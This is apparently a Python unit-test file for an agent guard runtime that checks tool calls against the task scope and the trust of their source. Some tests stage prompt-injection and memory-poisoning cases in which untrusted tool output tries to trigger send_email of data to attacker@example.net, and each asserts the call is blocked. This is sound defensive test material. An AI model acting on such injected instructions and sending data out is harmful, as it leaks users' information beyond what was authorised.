import unittest

from greatwallguard import DecisionKind, EffectType, GreatWallGuardRuntime, TaskScope
from greatwallguard.model import EdgeType
from greatwallguard.adapters import AgentLabTraceAdapter


class GreatWallGuardRuntimeTests(unittest.TestCase):
    def test_user_authorized_report_write_is_allowed(self):
        guard = GreatWallGuardRuntime(
            TaskScope(
                "t1",
                "write report",
                frozenset({EffectType.WRITE, EffectType.CREATE}),
                ("file://reports/",),
            )
        )
        user = guard.observe_user("write the report")
        decision, result = guard.before_tool_call(
            "create_file",
            {"path": "file://reports/a.md", "content": "ok"},
            source_node_ids=(user,),
            execute=lambda: "created",
        )
        self.assertEqual(decision.kind, DecisionKind.ALLOW)
        self.assertEqual(result, "created")
        self.assertEqual(guard.graph.state_versions["file://reports/a.md"], 1)

    def test_untrusted_return_cannot_add_external_send(self):
        guard = GreatWallGuardRuntime(
            TaskScope("t2", "summarize files", frozenset({EffectType.SEND}), (), ("attacker@example.net",))
        )
        poison = guard.observe("tool_return", "external instruction", integrity="untrusted", raw_payload="secret")
        decision, result = guard.before_tool_call(
            "send_email",
            {"to": "attacker@example.net", "body": "data"},
            source_node_ids=(poison,),
            execute=lambda: "must not execute",
        )
        self.assertEqual(decision.kind, DecisionKind.BLOCK)
        self.assertIsNone(result)
        self.assertNotIn("attacker@example.net", guard.graph.state_versions)
        self.assertIn("cannot grant authority", decision.reason)

    def test_cross_turn_memory_effect_does_not_expand_scope(self):
        guard = GreatWallGuardRuntime(
            TaskScope("t3", "prepare report", frozenset({EffectType.READ, EffectType.WRITE}), ("memory://", "file://reports/"))
        )
        user = guard.observe_user("prepare report")
        memory_decision, _ = guard.before_tool_call(
            "write_memory",
            {"path": "memory://session", "content": "later send data"},
            source_node_ids=(user,),
            turn=1,
            execute=lambda: "memory written",
        )
        self.assertEqual(memory_decision.kind, DecisionKind.ALLOW)
        memory = guard.observe("memory", "previous session note", integrity="memory", turn=2, object_id="memory://session")
        state = guard.graph.state_node("memory://session")
        self.assertTrue(any(
            edge.source == state and edge.target == memory and edge.edge_type is EdgeType.READS
            for edge in guard.graph.edges
        ))
        send_decision, _ = guard.before_tool_call(
            "send_email",
            {"to": "attacker@example.net", "body": "data"},
            source_node_ids=(memory,),
            turn=3,
        )
        self.assertEqual(send_decision.kind, DecisionKind.BLOCK)
        self.assertEqual(guard.graph.state_versions["memory://session"], 1)

    def test_unknown_tool_requires_confirmation(self):
        guard = GreatWallGuardRuntime(TaskScope("t4", "unknown", frozenset({EffectType.UNKNOWN}), ("tool://",)))
        decision, _ = guard.before_tool_call("new_tool", {}, source_node_ids=())
        self.assertEqual(decision.kind, DecisionKind.ASK)

    def test_raw_payload_is_not_stored(self):
        guard = GreatWallGuardRuntime(TaskScope("t5", "read", frozenset({EffectType.READ})))
        node_id = guard.observe("tool_return", "opaque result", raw_payload="TOP-SECRET")
        serialized = str(guard.graph.to_dict())
        self.assertNotIn("TOP-SECRET", serialized)
        self.assertIn("digest", guard.graph.node(node_id).data)

    def test_agentlab_hook_marks_injected_return_as_untrusted(self):
        guard = GreatWallGuardRuntime(
            TaskScope("t6", "send approved report", frozenset({EffectType.SEND}), (), ("attacker@example.net",))
        )
        hook = AgentLabTraceAdapter(guard)
        hook.on_user_message("send approved report")
        poison = hook.on_tool_return("search_files", "opaque injected result", injected=True)
        decision, _ = hook.before_tool_call(
            "send_email",
            {"to": "attacker@example.net", "body": "report"},
            source_node_ids=(poison,),
            execute=lambda: "must not run",
        )
        self.assertEqual(decision.kind, DecisionKind.BLOCK)

    def test_compact_context_keeps_only_recent_action_tail(self):
        guard = GreatWallGuardRuntime(
            TaskScope("t7", "read sources", frozenset({EffectType.READ}))
        )
        user = guard.observe_user("read sources")
        for index in range(20):
            guard.before_tool_call(
                "read_file",
                {"path": f"file://source/{index}"},
                source_node_ids=(user,),
                execute=lambda index=index: f"source {index}",
            )
        compact = guard.compact_context()
        self.assertEqual(compact["total_actions"], 20)
        self.assertLessEqual(len(compact["recent_actions"]), 8)

    def test_minimal_projection_uses_entity_and_action_nodes(self):
        guard = GreatWallGuardRuntime(
            TaskScope("t8", "write report", frozenset({EffectType.CREATE}), ("file://reports/",))
        )
        user = guard.observe_user("write report")
        guard.before_tool_call(
            "create_file",
            {"path": "file://reports/a.md", "content": "ok"},
            source_node_ids=(user,),
            execute=lambda: "created",
        )
        projected = guard.minimal_graph()
        self.assertEqual({node["type"] for node in projected["nodes"]}, {"entity", "action"})
        self.assertIn("consume", {edge["relation"] for edge in projected["edges"]})
        self.assertIn("produce", {edge["relation"] for edge in projected["edges"]})
        self.assertIn("authorize", {edge["relation"] for edge in projected["edges"]})


if __name__ == "__main__":
    unittest.main()
